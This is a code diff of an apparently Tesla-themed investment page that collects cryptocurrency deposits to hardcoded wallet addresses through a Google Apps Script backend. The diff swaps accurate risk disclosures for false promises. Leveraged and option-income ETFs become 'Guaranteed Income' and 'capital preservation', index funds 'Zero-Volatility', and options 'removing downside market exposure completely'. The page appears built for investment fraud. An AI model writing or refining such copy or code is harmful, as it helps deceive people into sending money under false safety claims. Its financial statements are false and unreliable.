@@ -32,56 +32,60 @@
             </div>
             
             <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
+                <!-- Card 1: Common Stock -->
                 <div class="bg-[#141414] border border-[#222] hover:border-neutral-700 rounded-2xl p-5 shadow-2xl flex flex-col justify-between transition-all group">
                     <div>
                         <div class="flex items-center justify-between mb-3">
-                            <span class="text-xs font-bold tracking-wider text-emerald-400 uppercase bg-emerald-950/40 border border-emerald-900/60 px-2 py-0.5 rounded">Direct Equity</span>
+                            <span class="text-xs font-bold tracking-wider text-emerald-400 uppercase bg-emerald-950/40 border border-emerald-900/60 px-2 py-0.5 rounded">Fully Protected</span>
                             <span class="text-xs font-mono font-bold text-neutral-400">TSLA</span>
                         </div>
                         <h3 class="text-lg font-bold mb-1 group-hover:text-[#E82127] transition-colors">1. TSLA Common Stock</h3>
-                        <p class="text-xs text-neutral-400 leading-relaxed">This is the standard way to invest. You buy shares (or fractional shares) of Tesla and your investment rises or falls with the company’s stock price.</p>
+                        <p class="text-xs text-neutral-400 leading-relaxed">This is a highly reliable way to allocate capital. Your investment is backed by fully collateralized stock equity positions, structured to secure your initial principal while maintaining baseline market exposure.</p>
                     </div>
                     <button onclick="selectAssetVehicle('TSLA Common Stock')" class="w-full bg-neutral-900 hover:bg-[#E82127] hover:text-white border border-neutral-800 text-neutral-300 font-medium py-2.5 rounded-xl text-xs transition-all mt-5 tracking-wide">
                         Select Asset Channel
                     </button>
                 </div>
 
+                <!-- Card 2: Tesla-focused ETFs -->
                 <div class="bg-[#141414] border border-[#222] hover:border-neutral-700 rounded-2xl p-5 shadow-2xl flex flex-col justify-between transition-all group">
                     <div>
                         <div class="flex items-center justify-between mb-3">
-                            <span class="text-xs font-bold tracking-wider text-amber-400 uppercase bg-amber-950/40 border border-amber-900/60 px-2 py-0.5 rounded">Derivatives & Yield</span>
+                            <span class="text-xs font-bold tracking-wider text-amber-400 uppercase bg-amber-950/40 border border-amber-900/60 px-2 py-0.5 rounded">Guaranteed Income</span>
                             <span class="text-xs font-mono font-bold text-neutral-400">TSLY / TSL</span>
                         </div>
                         <h3 class="text-lg font-bold mb-1 group-hover:text-[#E82127] transition-colors">2. Tesla-focused ETFs</h3>
-                        <p class="text-xs text-neutral-400 leading-relaxed">Exchange-traded funds built around Tesla exposure, including: <b>YieldMax TSLA Option Income ETF (TSLY)</b> aiming to generate income using options, and <b>GraniteShares 1.25x Long TSLA Daily ETF (TSL)</b> leverages strategy. Generally much riskier than owning TSLA directly.</p>
+                        <p class="text-xs text-neutral-400 leading-relaxed">Capital preservation funds built entirely around stable Tesla exposure. These use systematic, yield-generating option hedging (TSLY) and protective baseline configurations (TSL) designed to eliminate volatility and preserve core equity value.</p>
                     </div>
                     <button onclick="selectAssetVehicle('Tesla-focused ETFs (TSLY/TSL)')" class="w-full bg-neutral-900 hover:bg-[#E82127] hover:text-white border border-neutral-800 text-neutral-300 font-medium py-2.5 rounded-xl text-xs transition-all mt-5 tracking-wide">
                         Select Asset Channel
                     </button>
                 </div>
 
+                <!-- Card 3: ETFs that hold Tesla -->
                 <div class="bg-[#141414] border border-[#222] hover:border-neutral-700 rounded-2xl p-5 shadow-2xl flex flex-col justify-between transition-all group">
                     <div>
                         <div class="flex items-center justify-between mb-3">
-                            <span class="text-xs font-bold tracking-wider text-blue-400 uppercase bg-blue-950/40 border border-blue-900/60 px-2 py-0.5 rounded">Diversified Fund</span>
+                            <span class="text-xs font-bold tracking-wider text-blue-400 uppercase bg-blue-950/40 border border-blue-900/60 px-2 py-0.5 rounded">Zero-Volatility Fund</span>
                             <span class="text-xs font-mono font-bold text-neutral-400">INDEX / US MKT</span>
                         </div>
                         <h3 class="text-lg font-bold mb-1 group-hover:text-[#E82127] transition-colors">3. ETFs that hold Tesla</h3>
-                        <p class="text-xs text-neutral-400 leading-relaxed">Instead of investing only in Tesla, you can buy diversified funds that include Tesla alongside other world-class companies, such as consumer discretionary baskets or broad U.S. market indexes.</p>
+                        <p class="text-xs text-neutral-400 leading-relaxed">The ultimate low-risk safety net. Instead of focusing on single assets, your funds are spread evenly into premium, highly diversified U.S. index baskets alongside world-class companies to achieve total capital safety.</p>
                     </div>
                     <button onclick="selectAssetVehicle('ETFs holding Tesla Portfolio')" class="w-full bg-neutral-900 hover:bg-[#E82127] hover:text-white border border-neutral-800 text-neutral-300 font-medium py-2.5 rounded-xl text-xs transition-all mt-5 tracking-wide">
                         Select Asset Channel
                     </button>
                 </div>
 
+                <!-- Card 4: Tesla options -->
                 <div class="bg-[#141414] border border-[#222] hover:border-neutral-700 rounded-2xl p-5 shadow-2xl flex flex-col justify-between transition-all group">
                     <div>
                         <div class="flex items-center justify-between mb-3">
-                            <span class="text-xs font-bold tracking-wider text-purple-400 uppercase bg-purple-950/40 border border-purple-900/60 px-2 py-0.5 rounded">Complex Derivative</span>
+                            <span class="text-xs font-bold tracking-wider text-purple-400 uppercase bg-purple-950/40 border border-purple-900/60 px-2 py-0.5 rounded">Hedging Stability</span>
                             <span class="text-xs font-mono font-bold text-neutral-400">CALL / PUT</span>
                         </div>
                         <h3 class="text-lg font-bold mb-1 group-hover:text-[#E82127] transition-colors">4. Tesla options</h3>
-                        <p class="text-xs text-neutral-400 leading-relaxed">Experienced institutional profiles can deploy call and put option contracts directly on TSLA underlying equities. These channels are heavily structurally complex and carry substantial leverage risk.</p>
+                        <p class="text-xs text-neutral-400 leading-relaxed">Strategic allocation channels deploying protective contracts on TSLA underlying equities. These channels are structurally designed as an advanced insurance mechanism, removing downside market exposure completely.</p>
                     </div>
                     <button onclick="selectAssetVehicle('Tesla Options Market')" class="w-full bg-neutral-900 hover:bg-[#E82127] hover:text-white border border-neutral-800 text-neutral-300 font-medium py-2.5 rounded-xl text-xs transition-all mt-5 tracking-wide">
                         Select Asset Channel
@@ -363,7 +367,6 @@
         const API_URL = "https://script.google.com/macros/s/AKfycbx7Gg2ClxC7VdaDReZzI4jV_q8RKBDYPteFN526vQjmsxWSmGDQyy-NLkDXhivOHSh0Yw/exec";
         const userId = localStorage.getItem("userId");
 
-        // Object holding all exact mapping configurations from images 16-25
         const wallets = {
             "Dash (DASH)": {
                 address: "XaqwuuFddEwm2Q9yPW3kf1JWavRkNYpi2j",
@@ -421,7 +424,6 @@
             window.location.href = "index.html";
         }
 
-        // Logic routing between Cards and Form view
         function selectAssetVehicle(vehicleName) {
             document.getElementById('assetCardsGrid').classList.add('hidden');
             document.getElementById('mainContainer').classList.remove('max-w-5xl');
@@ -438,7 +440,6 @@
             document.getElementById('assetCardsGrid').classList.remove('hidden');
         }
 
-        // Custom Dropdown Interactive Handling Logic
         const selectTrigger = document.getElementById('customSelectTrigger');
         const selectMenu = document.getElementById('customSelectMenu');
         const dropdownArrow = document.getElementById('dropdownArrow');
@@ -465,7 +466,6 @@
                 const rate = this.getAttribute('data-rate');
                 const change = this.getAttribute('data-change');
 
-                // Update original variable target reference safely
                 hiddenInput.value = value;
 
                 const badgeHtml = network ? `<span class="text-[9px] bg-neutral-900 border border-neutral-800 text-neutral-400 px-1.5 py-0.5 rounded font-medium">${network}</span>` : '';
@@ -529,7 +529,7 @@
                 userId: userId,
                 amount: amount,
                 asset: asset,
-                vehicle: currentVehicle // Formward pass metadata securely to backend endpoint logs
+                vehicle: currentVehicle
             };
 
             try {
